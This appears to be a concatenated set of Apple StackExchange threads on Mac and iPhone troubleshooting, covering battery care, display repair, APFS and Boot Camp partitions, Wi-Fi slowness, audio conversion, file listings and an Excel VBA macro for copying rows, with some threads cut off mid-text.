hotspots.\nAnyway to get my Mac to auto-reconnect?\nSpecs:\niPhone 6 iOS running iOS 11.2\nMacBook Pro running macOS Sierra\n\nA: Go to Sytem Preferences>Network>Wi-Fi>Advanced>Wi-Fi and drag the item with hotspot name to the top.

Looking around the stackexchange it doesn't seem too unusual even on newer models. \nA bit of reading I've seen tells me this can be caused by keeping devices charged at 100%. I've been using fruit juice to remind me to unplug regularly. As I already have a system to alert me of when the battery is at a certain charge level, this is not what I'm looking for.\nI was wondering if there's anything I could do to charge the battery on my current MBP (11,3) to a safe level, eg. ~80% charged, and keep it at that level while plugged in to the charger?\n\nA: In short, no. Well, at least not without changing the SMC Firmware. \nThe SMC (System Management Controller) is responsible for controlling a range of power-related functions (e.g. controlling fans, reading and responding to sensors, controlling temperature levels, the battery, etc). This is not something you want to mess with.\nIn terms of battery swelling, there are many factors that contribute to causing this and one of those factors is time. For example, I was responsible for a small fleet of MacBookPro5,1 models being used by five staff members, all of whom had two batteries (so they could hot swap them as required). All of these batteries swelled over time, despite the fact these laptops were used off AC Power for most of the day five days a week. The fact these devices were not kept at 100% charge made no difference whatsoever!\nIn a nutshell, if you're happy using FruitJuice then keep doing that. But trying to force the SMC (or circumvent its function) is likely to cause you more problems than its worth.\n\nA: The new batteries are so far, far, far superior to the old ones I would say you are not going to achieve any measurable or meaningful benefit from micromanaging the charge algorithm. \nApple has fundamentally changed the top off charge algorithm and has multiple cells so even at 95% charge one cell can be resting with the rest topped off. \nAny Apple battery rated at 1000 charge cycles is in the same class if it’s 2010 or later model year. \nEven if you could change the charge, I wouldn’t since Apple engineering likely did a better job than we could trying to modulate the charge levels to support long life of the battery. \n\nA: You could do it with hardware.\nAn arduino, a relay and some scripting would do it.\nor just a bluetooth/wifi controlled power plug.\n", "Q: How do I fix interlacing lines going up and down on iPhone SE display My wife's iPhone SE is a couple years old and many drops in (probably average of 1/week at least). It's been rock solid this whole time, but earlier today, it started having horizontal lines going up and down the display, and the lines seem to get more intense if the iPhone is doing some heavy processing or rendering something on the screen.\nA picture is worth a thousand words:\n\nAnd a video is worth a thousand more: https://drive.google.com/file/d/1J9lbanGn2kJjAWpwKJxgnOkVWpWQJDV0/view?usp=sharing\nI tried resetting the phone, updating to iOS 11, and shutting it off, waiting a while, then turning it back on, but nothing seems to get the lines to go away completely. My wife said it was intermittent at first, but it seems to be happening all the time now that I'm trying to debug it.\nAny ideas? Do I need to replace the front panel assembly (e.g. using replacement from iFixIt)? Or could this be something deeper that would require more work/replacement than it's worth?\n\nA: As it turns out, it was something in the display assembly. I purchased an iPhone SE LCD Screen and Digitizer Full Assembly from iFixIt, then followed the meticulously-detailed iPhone SE Display Assembly Replacement guide, and after another hard reset, the display was back to its former glory!\nOne caveat for those replacing the display assembly: When re-assembling, if it's hard to snap the top part of the display into the body of the iPhone, check if there are extra bits of glue or plastic on the new assembly. It seems the iFixIt replacement parts sometimes have an extra bit of goop that needs to be shaved off in order to fit well.\nIf the display doesn't snap in snugly like the old one, you could end up putting pressure on both the earpiece and vibration motor, which can make sound and vibration features a bit strange (tinny or even nonexistent!) until you fix the problem.\n", "Q: After restoring FTP server in High Sierra, how to log in to localhost?

I was looking for some help.  I have a mac and an iPhone.  I have 200 important notes in my icloud.  I am scared that something will happen to my phone or mac and I will lose all my notes because my icloud is not backed up.  I am looking for a way to relocate all of my notes to something more universal that does not need to be backed up (Gmail).  \n\nA: *\n\n*Your notes are backed up in iCloud.

I used to work as a salesperson at an Apple retailer. I remember that prior to WWDC Apple usually changed the target price on old computers before the new computers were launched. (I guess they are easier to sell before the new models come out). Are there any statistics when this usually happens and how much those prices change?\n\nA: I am not aware of public price cuts prior to WWDC. At least not with today's Apple.\nThe practice you mention may no longer be in place, it may be limited to some stores, or it could be country/region specific.\nApple's computer products tend to maintain the same price for their lifetime. iOS devices can attract discounts over time – their more predictable update cycle helps with this.\n", "Q: How can I move Macintosh HD out of container disk1? I had partitioned my hard drive for Windows to be ran on it through Bootcamp. Everything was working okay, I could run in MacOSX or Windows. After I installed macOS High Sierra I began to have issues. When I was in Windows it would not find the MacOS disk. I was only able to load into OS by restarting Windows and holding down the 'option' key. \nI loaded MacOS, then deleted the Windows Partition. Now my disk looks like this:\n\nMy diskutil list reads:\n\nMacintosh HD is under a container disk, I have a bootcamp that cannot be used, and I have OSXRESERVED that I do not know what it is for. How can I delete OSXRESERVED, BOOTCAMP, and move Macintosh HD out of container disk1?\n\nA: A couple of misconceptions to clarify first:\n\n\n*\n\n*It is correct that Macintosh HD is in a container, since it is an APFS volume since High Sierra. This is the title of your question, so the answer is here first. It is not possible to move an APFS volume out of any container. It is correct that the startup volume, an APFS volume, is within an APFS container.\n\n*It is correct that Windows cannot see Macintosh HD any more. Apple have not provided APFS drivers for Windows and the Boot Camp Control Panel cannot see Macintosh HD.\nWith that out of the way, we can deal with removing Boot Camp. Make sure you have a backup.\nYou should be able to open Boot Camp Assistant and choose Remove Windows.\nThis automates the process for you.\nAlternatively with Disk Utility:\n\n\n*\n\n*In Disk Utility, select APPLE SSD. Click the Partition button on the toolbar.\n\n*You should see a pie chart of the partitions on your disk. Select BOOTCAMP and click the – button to remove it from the pie. Repeat this for OSXRESERVED.\n\n*Expand the size of the container (Macintosh HD) to fill the rest of the disk, otherwise you will be left with free space not assigned to any partition.\n\n*Confirm that the rest of the disk partitions look correct, then choose Apply.\n\n", "Q: What happens if I use a 60W rated USB-C cable to charge my Macbook from the 85W power brick? Will they still be able to negotiate the correct charging amount of 60W and not overload the cable?\n\nA: \nWhat happens if I use a 60W rated USB-C cable to charge my MacBook\n  from the 85W power brick?\n\nNothing.  It will work fine.\nA watt is a unit of work (power) and is calculated with the formula:\nWatts = Volts * Amps \n\nA cable is rated for how much current (amps) it can handle - volts mean nothing.  For example, using the same cable and a 60W load on 22 AWG wire (22 gauge) with two different scenarios\n\n\n*\n\n*3V at 10A would fry the cable\n\n*12V at 5A would be fine\n\n\nI could put 50,000 volts so long as I didn't exceed the amperage, I'm ok.\nThis is why a wattage rating on a cable is incorrect.\nGiven that the Thunderbolt cable conforms to USB 3.1 and the power delivery spec for calls for up to 20V at 5A or 100W, your cable will handle it.\n", "Q: Would it be safe to use Ubuntu on an unsupported Mac? I run OS X El Capitan on a Unibody MBP 13-inch mid-2009 and support for El Capitan is likely going to run out in fall, so as El Capitan is the last OSX update supported for my MBP, I will stop using OSX in a few months. The MBP still runs fine though hardware-wise so I’m thinking of just using it with Ubuntu. I’m just wondering if this would be unsafe as I can’t get any updates anymore for Mac OS X or if it doesn’t matter and I’m fine using Ubuntu security-wise? Thinking of things like maybe firmware updates that would have to be tailored to MBP hardware and supplied by Apple (but I’m really just guessing). Any advice is appreciated, thank you!\n\nA: This should be fine.\nA mid-2009 MBP won't be seeing any firmware updates from Apple.\nIf you ever found some reason you needed to run macOS on the machine, you can boot from a USB stick. Consider prepping that USB stick before you switch to Ubuntu.\nLinux can definitely help breath new life into an older Macbook. You may want to consider a lighter-weight desktop environment or window mananger to maximize that benefit, though.\n", "Q: Using airprint for SMB printer I am trying to print using a HP LaserJet Enterprise M609 connected with spoolss (i.e. smb).  I can connect and authenticate with other printers that way, and they all print using the 'generic postscript driver', but this printer does not work with this driver, for reasons unknown.  Apple lists it as one of the printers that would be able to use AirPrint, but this is not an option I can select.  Any idea how to tell the printer to use AirPrint?\nThe steps I need to follow are the same as these, and work for other printers.\n\nA: If you are a student at University of Illinois Urbana-Champaign, you'll have to log in using your credentials so they can log your prints/charge you for your prints, which is currently incompatible with AirPrint. AirPrint can be disabled by your system administrator on a printer-by-printer basis.\nYou may have better luck directly contacting your school's help desk.\n\nA: The answer turned out to be nothing to do with Airprint, but simply getting IT to changing the printer driver to Universal Printing PCL 6 (this was found by trial and error, nobody had a clue).  Live and learn!\n", "Q: Deleting all photos from iCloud immediately 2018 I would like to delete all of my photos from icloud immediately.

If not, has apple devised a way to down mix them? Today I downloaded a soundtrack composed of 19 tracks.\nTheir format is FLAC (24bit depth and 96kHz sampling).\nIn order to add them to my iTunes library and eventually to my iPod, I converted the files to ALAC (24 bit 48kHz) which is the maximum my 7th gen iPod classic can handle. \nProblem is, iTunes won't let me import those converted files into the library.\nI noticed those files have 6 audio channels.\nI think that is the problem, and I've started looking for an answer.\nInternet wasn't very clear, unfortunately.\nMy question is : is there a way to import those files to iTunes? \nIs there a way to down mix the files to 2 channel audio or similar, so iTunes can handle them?\n(I hope such a conversion wouldn't distort the audio) \nI usually use XLD to convert my audio files, and there's no option for down mixing.\n\nA: I sorted it out!\nYou can down mix the audio files from 6channel to 2 channel using ffmpeg\n(you have to use the terminal, though).\nThe down mixing process is quick and there are no perceivable distortions in the audio.\n\nA: I've just found it is actually possible to get multichannel file into iTunes, but AFAIK iTunes won't actually play it back in anything other than stereo. (Still useful if your library is used outside by other software which can play multichannel.)\nI set my encoder to:\n\n*\n\n*Profile: MPEG-4 AAC LC\n\n*Gapless: iTunSMPB\n\n*\n\n*Method: CBR\n\n*Bitrate: 960k(Note: For a 6ch file, I suppose this is equivalent to stereo 320k. When I set it to 6000k, which was close to my source file, I got a roughly 1320k file as a result, so perhaps AAC can't push much higher than that.)\n\n\n\nAnd my decoder to:\n\n*\n\n*Bit Depth: Original\n\n*Sampling Rate: 44100(Note: It's probably best to match this to whatever the original file is. I guess you can set it to anything up to the max your iTunes is configured to play, but obviously going higher than the original file is likely pointless.)\n\n*Channels: Original\n\nThis allowed me to convert a 6ch WAV to a 6ch AAC m4a file. Playing the file in VLC and looking at the Codec Info viewer verified the 6 channels were present (as did just listening to the file in VLC). I could import and tag the new .m4a file in iTunes just like any other file, but like I said, it only plays in stereo (down-mixed, I think, rather than losing the 4 extra channels).\nI used TAudioConverter (more info, or download here), which is Windows only unfortunately, but there's likely another similar program for Mac. I imagine anything based on the fdkaac encoder, or even ffmpeg, can probably do it.\nOh, and if you do decide to use TAudioConverter for this, you might run into a minor issue/bug which results in a few error popups when you start the program which claim \"Bass.dll\" is missing. Accept/close them all and, once they stop popping up, just launch the program for a second time; it will load properly, then\n", "Q: MacBook Pro 15\" 2015 CPU throttles down to 0.8 GHz My MPB has had this problem for years every time the ambient temperature gets a bit warmer. It starts in the spring and gets ridiculous during the summer.\nThe MBP clocks down its processor to 0.8 GHz, making it pretty much unusable. This happens as soon as some process-demanding apps (like NodeJS or Unity) are running on the machine.\nHowever, the CPU temperature is just fine, between 60 and 80 degrees Celsius. It doesn't look like a thermal problem. Thus, I don't understand why this happens?\nI tried every hint I found on the internet, including resetting SMC and NRAM, I even re-installed macOS.\nBecause this has happened from day one, I have been at the Apple Store many times, and the MBP now has its 4th logic board (!) Still, the problem remains.\nWhat else might cause this strange phenomenon? I'm at a loss!\n\nA: Just to show that adding to a two year old question is worthwhile, imike's comment from only a month ago, was spot on for me (although waldgeist himself had already begun to suspect the same in his own comment from only a day after his original post.)\nSo I have this very same MacBook Pro model, and was seeing the very same issue. And that very cause -- an external HDMI-connected monitor -- is at play. \nThe following shows two instances of it happening. In each case: something has caused the frequency to flatline; I remove the HDMI cable from the Mac; and within a few seconds things return to normal.\n\nI still don't know how the external monitor (Samsung U32J59x) is having this effect, but it's a step forward to at least know it is.\nADDENDUM\nRed Herring alert. Sadly, whatever this is, it turns out it is not specific to HDMI. I have now seen it with an old Apple Cinema Display. I've even seen it while driving an iPad as an extra display using Duet. In each case, detaching the external device solves the problem and the frequency returns to normal. But in fact, I've even seen it occasionally with no external display at all. For example, it will sometimes happen during a video call (with Zoom, at least). There, I can solve the problem by turning off the video channel in my call (i.e. using only the audio channel). \nSo it may be as benwiggy suggested in a comment, something to do with graphics in general and the GPU. In other words, it's not an HDMI monitor, or even a monitor at all, but some function of an increase in graphics demand (which of course adding an external monitor would probably be an example). Push demand high enough and the CPU crawls into a corner and curls up; then remove the demand and the poor wee thing comes out of fibrillation and recovers. Sounds credible I guess.\nOne other point for anyone else chasing this thing. I can't be sure--maybe I'm now just fixated on it --but I could swear the problem is getting worse, week by week. If I do plug in an external display, it will happen, and fairly quickly. Five, maybe ten minutes at most, and then the frequency falls off a cliff and performance becomes barely usable. Then, detach the display and it will recover. It's less obvious when it happens when there is no display attached -- i.e. during a Zoom call -- but it's still highly likely. \nSo, what aspect of the machine could be deteriorating week by week and so could create this getting-worse effect? Well, the battery for one. And I recall that a battery issue was mentioned in a related thread. Also, I did have a power issue with this machine, about a year ago. While debugging that, I did get a couple of warnings that my battery needed replacing. In the end the problem turned out to be a PSU issue, and getting a new one did seem to solve it. And so I put the battery warnings down to mere bad-PSU-induced delusion on the part of the Mac's battery monitoring system. But it's perfectly possible there was indeed a battery issue beginning to appear, in addition to the main PSU one.\nSo I'd say that may be a worthwhile lead to pursue.\nBut for me: well I just didn't have time to keep debugging and so I went for a much more certain solution.

If so download the combo update for 10.13.4 and run that.\nIf not, then the big question is can you boot into recovery mode (⌘r) at startup?\nIf you can I would first run disk utility and see if it can repair the disk. If it reports errors that can't be fixed, you have a problem as I am not aware of any 3rd-party disk repair utilities that can repair APFS disks (anyone?). \nPlease tell me you have a current backup that you can restore from?\nIf not I would be tempted to take it to an Apple Store and see if they can do anything with the drive.\nIf Disk Utility can fix or finds no issues, I would reinstall MacOS from Recovery Mode. It shoudn't wipe any of your files but depending on what happened I could not guarantee that.\nThat should get you started.\n\nA: This happened to a colleague the other day. \nSolution:\n\n\n*\n\n*Hold Shift key during boot to enter Safe Mode.\n\n*Log in (whilst still in Safe Mode) and run OSX Updates\nIf you're lucky an OSX Security Update or similar will be waiting for you. Basically any OSX update that requires a reboot should do (fingers crossed) as it rewrites the broken update process.\nCause:\nOSX Update process failed to execute properly. This could be due to power failure / file corruption. Overwriting the reboot/install process with another one fixes it.\n", "Q: How do I Undelete a Bootcamp drive back to NTFS I have a recently formatted an (MS-DOS)Fat disk inside my mac.\nThe problem is, this was my BOOTCAMP drive formatted in NTFS.\nI have read a bit on how to use fsck to (undelete) a drive and watched a few youtube vids. And am fairly comfortable with the terminal.\nFor example \"sudo fsck_ntfs -d /dev/disk1s1\" or \"sudo fsck_exfat -d /dev/disk1s1\nHowever, none mention this PEBCAK problem.\nHow do I get the original drive back? What is the magic sequence to get from FAT to NTFS with most of the files back?\nThanks in advance\nRyan\n\nA: I'm quite suspicious about if such commands as \"fsck_xxx\" will meet your purpose. These commands usually aim to check the corrupted file system or broken file links. Under your situation, if the partition had been kept the size unchanged while formatting it into FAT32 from NTFS, maybe this software named \"Disk Drill 3\" could carry out “quick scan or deep scan\" to locate the ntfs files before the format. So I suggest following steps:\n1, Check out the free version \"disk drill 3\" software for MacOS, https://www.cleverfiles.com/file-system-recovery-mac.html. Contact with the technical guys of the company may get better understanding of your concern and suggestions.\n2, Running \"preview of all recovery method\" function of the free version software to check if there are any recognizable files on the bootcamp partition.\n3, If nothing could be found on that FAT32-format partition, use the MacOS's disk utilities to reformat the partition back to NTFS; repeat step 2 again.\n4, If you found the files and think them worthy of the money for the Pro version, pay and use the pro version to do the deep scan and get recovery of your files.\nI never use this \"disk drill\" software to recover files in a formatted bootcamp partition. Hope you good luck and find all your files back.\n", "Q: Attempting to use a an IF formula to dynamically copy cell contents given the presence of a specific value I need to duplicate cells from one worksheet to another if the associated record [row] contains a given word.\nSay row 2 has \"foo\" in cell A, I would like to duplicate all the cells in that row to another workbook. If A3 has \"floop\" in it no cells should be duplicated—it would be skipped essentially (without a blank row).\nThe data is as so:\n    A   |   B   |  C\n\n2  foo  | blah  | blah\n\n3 floop | blah  | blah\n\n4  foo  | blah  | blah\n\nThe resulting table would be as so:\n    A   |   B   |  C\n\n2  foo  | blah  | blah\n\n3  foo  | blah  | blah\n\n--\nThis is as far as I've gotten:\nI've created a helper table beginning at A52 to sort the data for which \"foo\" is present in column A utilizing the formula =IF(ISNUMBER(SEARCH(\"foo\",a2)),a2,\"\")\n[Which I have a feeling is redundant, but is the only bit that seems to be working.]\nIn the final table I'm using =IF(ISNUMBER(ISBLANK(A52)),A2,[!!!!!]) \n[Wherein [!!!!!] is the display code that I don't know.]\nIt resolves as \"FALSE\"\nI know this is likely an elementary question, but I haven't had any luck finding an answer elsewhere.\nThanks in advance! \n- p\nPS  As I'm writing this I realize that I'm going to need to process the entire row as opposed to the individual cells, so I'm likely going to need another approach. Oh well! I've gotten this far!\n\nA: Using an IF formula to achieve this is going to be problematic for a number of reasons. But assuming you got it to work, you're always going to have the issue that a formula has to be placed within a cell and therefore your workbook is not scalable (i.e. what happens over time if/when you add/delete rows)? Sure, you can work around that too (e.g. by formatting your data as a proper table/list), but from my experience you'd be better to use a macro to do this.\nStep 1: Add the Developer tab to Excel\nFirst of all you need to ensure that you have the Developer tab visible in Excel's ribbon. If it's already there (typically it's the last one after the View tab, then skip to Step 2: Creating your macro. Otherwise, follow the steps below:\n\n\n*\n\n*Launch MS Excel\n\n*Go to Excel > Preferences (or just press the command, keys)\n\n*Select the Ribbon & Toolbar icon\n\n*Ensure the Ribbon tab is selected at top\n\n*On the right-hand side you'll see a list of tabs - select the checkbox next to the Developer tab (it's probably listed at the very bottom)\n\n*Click on the Save button\n\n*Exit Preferences\n\n*Now you'll see the Developer tab (see image below):\n\n\n\nStep 2: Creating your macro\nNow we need to create your macro. Follow these steps:\n\n\n*\n\n*In Excel, make sure you have your workbook open\n\n*Select the Developer tab\n\n*Click on the Visual Basic option (at far left of the Ribbon)\n\n*This will open the Microsoft Visual Basic window\n\n*The top left of the window should look something like:\n\n\n*Now right-click on ThisWorkbook and select Insert > Module (see below)\n\n\n\n*In a few moments you should see a white window open on the right-hand side of the Visual Basic Editor\n\n*Now copy the code below and paste it into the white space:\nSub CopyRowsBasedOnCellValue()\n'This macro copies rows from one worksheet to another within the same workbook if that row contains a specific value in Column A\n    Dim xRg As Range\n    Dim xCell As Range\n    Dim X As Long\n    Dim Y As Long\n    Dim Z As Long\n    X = Worksheets(\"Sheet1\").UsedRange.Rows.Count\n    Y = Worksheets(\"Sheet2\").UsedRange.Rows.Count\n    If Y = 1 Then\n        If Application.WorksheetFunction.CountA(Worksheets(\"Sheet2\").UsedRange) = 0 Then Y = 0\n    End If\n    Set xRg = Worksheets(\"Sheet1\").Range(\"A1:A\" & X)\n    On Error Resume Next\n    Application.ScreenUpdating = False\n    For Z = 1 To xRg.Count\n        If CStr(xRg(Z).Value) = \"foo\" Then\n            xRg(Z).EntireRow.Copy Destination:=Worksheets(\"Sheet2\").Range(\"A\" & Y + 1)\n            Y = Y + 1\n        End If\n    Next\n    Application.ScreenUpdating = True\nEnd Sub\n\n\n*Now you should see something like the following:\n\n\n\n*Now you will need to customise this code slightly as it's currently written specifically for the example in your question. You need to customise the following aspects:\n\n\n*\n\n*Replace the two instances of Sheet1 with the name of your first worksheet (i.e. the one you're copying from)\n\n*Replace the three instances of Sheet2 with the name of your second worksheet (i.e. the one you're copying to)\n\n*The instance of A1:A indicates the column being searched for the value you're trying to match (i.e. the \"foo\" value in your example. If it's not Column A in your worksheet, then change the A to whatever column it needs to be. For example, if your worksheet contains the \"foo\" value in Column D, then this needs to be D1:D\n\n*Finally, you will see a single instance of \"foo\" in the code. Replace the foo with whatever value you're trying to match.\n\n\n*Finally, you will need to save your workbook as a macro-enabled one. To do this, click on the Excel icon at top left to return to Excel and then choose the Save As option from the File menu. For the file format you must select the Excel Macro-Enabled Workbook (.xlsm) option from the drop-down list.\nStep 3: Using the macro\nNow you're set to go. To use the macro, follow these steps:\n\n\n*\n\n*Launch Excel and open the workbook\n\n*Select the Developer tab\n\n*Click on the Macros icon (it should be the second one)\n\n*This will bring up the Macro window:\n\n*Select the CopyRowsBAsedOnCellValue macro (see below)\n\n\n\n\n\n*Click on the Run button\n\n*Your macro will run and all rows matching the criteria will be copied to your destination sheet. Below is an image showing the before and after shots, based on your example:\n\n\n\n\nNote: The above code was adapted from code originally sourced from https://www.extendoffice.com/.

Unfortunately there doesn’t seem to be a similar option on Apple Watch (currently 4.3) when leaving the phone behind. Am I missing something obvious here?\n\nA: No, you're not missing something obvious. At present there is no way to do this within watchOS (as of v4.3). \nWhile Apple hasn't officially commented on whether it's a feature that may be added, it's probably something that will eventually come since the Apple Watch will continue to develop as a standalone device.\nIn the meantime, Apple states:\n\nHearing loss  Listening to sound at high volumes may damage your hearing.

If you go into System Preferences and open the \"Profiles\" preferences you may see the configuration profiles installed on your computer.  I would expect to see one called \"MDM Profile\" and one or more that configure other aspects of your computer, such as the Finder. \n\nA: As this is abnormal behavior and you say that the Mac is configured and managed by your IT Department, I would say that you have contact them, because it's most likely their doing....\n\nA: Try Path Finder.

So, I changed all my info. And when I want to unlock to make changes, it shakes (probably error). But I can log in. Can I reset a password without data loss?\n\nA: If you use multiple keyboard layouts on your Mac - or if you ever did - it's possible that the layout you think you're using at login or while logged in is not what you think it is. Try turning on Accessibility and using an onscreen keyboard at login. See if the letters for your password are what you think they are.\nI live in France/Switzerland, so a common occurrence is people not aware that their keyboard layout is US, UK, French (France) or French (Swiss). So inevitably, there are lots of \"y\" and \"z\" inversions. Sometimes \"a\"/\"q\" and \"z\"/\"w\" as well.\nAdditionally, if there are any other Admin users on the system, use one of them to unlock the Users & Groups System Preference.\nThe last option is to reset the password using System Recovery.\n", "Q: Encrypted image duplicates backup in time machine I have some sensitive work data on my mac that i keep in an encrypted backup.

So every time you modify the image (even just the access date of some of the files in it) TM will register the image as a changed file and backup the whole image again.\nYou can exclude folders in TM preferences, so you could move your image into a dedicated folder and exclude it. And then use other means, e.g. a USB drive, to backup the image manually.\nYou could also use DiskUtil to create a new encrypted image as a \"sparse bundle\" and move the confidential content into this newly created image. Using the \"sparse bundle\" format should, in theory, allow for a more granular update record so TM doesn't need to backup the whole image each time. I had some mixed experience with this in the past though.\n", "Q: How to find the iOS version of a reset iPhone I have an old iPhone I want to sell and I don't remember which iOS version is installed on it.\nI am currently presented with the \"Hello\" setup screen.

Is there anything I can do apart from waiting until Monday to resolve it at my school? I need this thing for the weekend.\n\nA: You'll need your firmware password to boot into anything other than macOS (which is why it's called a firmware password). If you can't remember your firmware password your only real option is to take your computer to the Apple Store.

See screenshot here:\n\nThis all seems ok from what I've read, however, the Wi-Fi still runs very slowly on my Mac. When I run an internet speed test my download speed is consistently < 1Mbps when it's above 20 on all other devices. \n\nA: You are on the 5 GHz band, and you don't mention what is your Mac model. So maybe you have the same problem I had.\nI found that the WiFi on my MacBook Pro (late-2013) works slowly on 5 GHz / 80 MHz channels (topping out at about 30 Mbps). Enough so that it's at least 3x faster when connected to the 2.4 GHz band in the same router (and I say at least because I can't measure any higher). So, if your router works in the 2 bands and your Mac is switching between them transparently (as it usually does, which usually is advantageous), then you would be seeing big, mysterious changes in speed.\nThe solution for me was to set the router to work on 40 MHz channels in the 5 GHz band; before, it was set to Auto channel width, which makes it try using the 80 MHz width, and looks like the MacBook didn't like that. Interestingly, an iPhone 7 and iPad Pro had no trouble with it.\n(Some more context and info moved to a blog post)\n\nA: After speaking to a friend I established that this problem is potentially due to the macOS Sierra update. I followed the first step in this link - removing existing Wi-Fi preferences. Which seems to have worked for now.\n\nA: I had the exact same issue. I went through every link on every result from Google by others who had this issue and nothing worked for me.\nA user in one of the Apple threads suggested creating a new user profile, because that had worked for them. When I created a new profile, I got an incessant popup that asked me to login to a VPN account (I have NordVPN but it wasn't running at the time and I barely use it) -- this popup was blocking my access to my wifi though! So I rebooted in safe mode and logged into the new profile. Sure enough, the wifi was back to being fast.\nI looked up info about the popup and apparently it's another known issue on Macs, and the only solution is to uninstall the VPN. So I deleted NordVPN, and the wifi was working fast on the new profile. Then went back to my main profile to start the process of migrating that account data to the new account, only to notice that the wifi was back to being fast on my old profile too now!\nSo tl;dr:\nTry uninstalling your VPN. I have no idea what the problem was, but in the end, deleting my NordVPN app worked when none of the other solutions made any difference.\n\nA: I had the same problems but eventually found the culprit - an app called Weather Underground. Deleted it and problem solved. Suggest installed apps are a good place to start resolving this problem.\n\nA: I have been seriously struggling with my WiFi every morning in my new office and could not figure out why. Speedtest was 'very slow' on my Macbook Pro 2015 and super quick on iPhone 8, it has been painful and driving me nuts!! It usually got quicker throughout the day, but unbearable in the morning.\nAfter reading the above post about the VPN, I searched (cmd + spacebar)  for 'vpn'. I had no applications installed but there were about 4 files with name vpn in them in a resource folder within After Effects, I had no idea what they were but they were being modified constantly!\nI deleted them and boom, my internet went fine! Hope this helps someone and I hope that has fixed my issue for good.\n\nA: For me the problem was only at 2.4Ghz.\nLuckily i could configure my router to only use 5Ghz. now it finally works!\n\nA: It is very annoying but I think Mac books uses very bad quality wifi network card. My wifi router shows connection speed between devices and router. There is only one wall between router and my mac. My mac's speed is barely above 5 Mb and I usually see 1 Mb. Even my ping from mac to router takes 2 seconds sometimes. If I move my mac to next to the router, speed increases to 130 Mb. Hence, my 5 years old iPhone 6s is never below 50 Mb, 7 years old sony android speed is never below 70 Mb. Sometimes, I think there is maybe a iWifi product by Apple which I have to buy to get better wifi connection just for I can use wifi in another room.\nMy solution is to take a wifi router exclusively for my mac will work just 1 meter away from the mac.\n\nA: I had to create a new profile and disable location services in Security settings to make it work.\nIt seems this setting in macOs 10.15 greatly effect wifi connection speed, when you download something it likes that you got a speed limitation.\n", "Q: Delete app data without deleting app One of the apps I have installed is not working super well and I'd like to try deleting its data to see if that helps.\nUsually, when you delete an app on iOS, it warns you that all data will be deleted. As such, the common advice is simply deleting the app and then redownloading it from the App Store.\nHowever, this app has been delisted from the App Store, meaning it can't be redownloaded, so I don't want to delete it. What else can I do?\nFor what it's worth, this is an iPhone 4 running iOS 7.\n\nA: Depending on the version of iTunes you have you may be able to do this. You need the last one that has App Management built in. This one to be specific.\nAs long as the needed app is listed in iTunes and you can find the .ipa file on your hard drive, it should be safe to delete the app from your phone and then sync with iTunes to put it back.\nIt has been a long time since I tried this, you might want to wait till someone else who has done this more recently can verify this just to be safe\n", "Q: How to obtain a list of files contained in a folder (as a text file) I have a huge folder containing musical scores and books (mainly in .pdf).\nI would like to create a text document (TextEdit will do just fine) which contains the complete list of the folder's content (possibly even divided into subfolder).\nIs it possible? \nIf not in a TextEdit file, maybe in Numbers? \nIs there any Automator process that can update that file so that when I add or modify a file, an entry is added / modified? \n\nA: *\n\n*Open Terminal\n\n*find TOP-FOLDER -type f -print | sed 's_/_,_g' > ~/filelist.csv\n\n*Import ~/filelist.csv into Numbers or Excel\n\n\nA: I had a similar need recently. You used to be able to print Finder windows but you can't do that any more. The best I was able to come up with was using a unix command:\nls path/to/folder/in/question > ~/Desktop/folderlist.txt\n\n\nA: Alternatively, I think I might have found something that is not ideal but it definitely provides a temporary solution.\n\n*\n\n*In Finder, select the Parent Folder and then Cmd-2 (View as List).\n\n*Select All and press Cmd-Option-RightArrow to expand the content of all the subfolders.\n\n*Copy the whole content (Cmd-C)\n\n*Create a TextEdit document and go to Format > Make Plain Text\n\n*Paste the content (Cmd-V)\n\nIf - as in my case - you had the principal folders with uppercase titles it will be easy to divide the document in categories.\nHope this helps (as it did to me!)\n", "Q: File Sharing User Limit? Does non-Server macOS still have a file sharing user limit these days? The way they are abandoning the idea of running Mac Servers, it seems plausible they could have removed the file sharing limit from \"client\" macOS.\nAlso was the former (and maybe current) 10-user limit, a limit of the number of different file sharing users that could connect at once, OR a limit of the number of inbound filesharing connections?\nIn other words, if you created two file sharing users, could 15 people connect if 7 used account A and 8 used account B?\n\nA: No - people will not connect due to slowness of the storage backing the share long before you'll hit a limit on connected users if there even is one.\nI've got 55+ connections to a couple Mac Mini each running just normal sharing and server sharing of various flavors.\nI recommend performance mode for any situation where you run a web app or server app or file sharing.

The issue is with Apple MacBook Air \"Core i5\" 1.6 13\" (Early 2015).\nIt had not been backed up in a while but an update to High Sierra was attempted. The update failed and now a regular boot or safe mode boot leads to the \"question mark folder\". Booting in recovery mode or web-recovery, then attempting to update the OS leads to \"Downloading installer information to the target volume failed.\"\nAt this point the main concern is to recover the files. In terminal I can see that the files are there, but I can't mount an external drive to copy them. There is power at the USB ports but nothing shows up in Disk Utility ( or \"diskutil list\").\nI made a bootable USB with El Capitan on it, and when I boot from that, the USB ports work. But now the SSD won't mount, so I can't recover anything. \nRunning \"diskutil list\" shows the SSD as disk0/disk0s1/disk0s2, but only disk0/disk0s1 can be mounted (of course disk0s2 is the partition I need to access). disk0s2 is APSF, and I don't think its encrypted.\nHow else can I get one of these disks mounted?\n\nA: The problem, whatever it was exactly, was solved by having the update completed at an Apple store, connected directly to an update server. Hopefully somebody finds this useful.\n", "Q: MS Word documents changing to .cpio files and then to .zip files I really need help with this issue: whenever I try to open a word document file from my Mac, the archive utility application opens up and turns the .doc file into a .cpio file and if I click on that it then turns into a .zip file. \nI've tried to research and even called Mac Support and they were not helpful. I just want my MS Word files to open up when I double click on them. I don't know how to stop the archive utility from opening up. It's a repetitive cycle of .cpio file to .zip file to .cpio and so on. \nIf anyone knows how to fix this issue please let me know. \n\nA: When a document opens with the wrong app the first thing to do is see what macOS thinks should happen.\n\n\n*\n\n*In Finder find a document\n\n*Right click on it and choose Get Info\n\n*Look at what Open with... shows \n\n*If it is the wrong application alter it to be the correct one e.f.

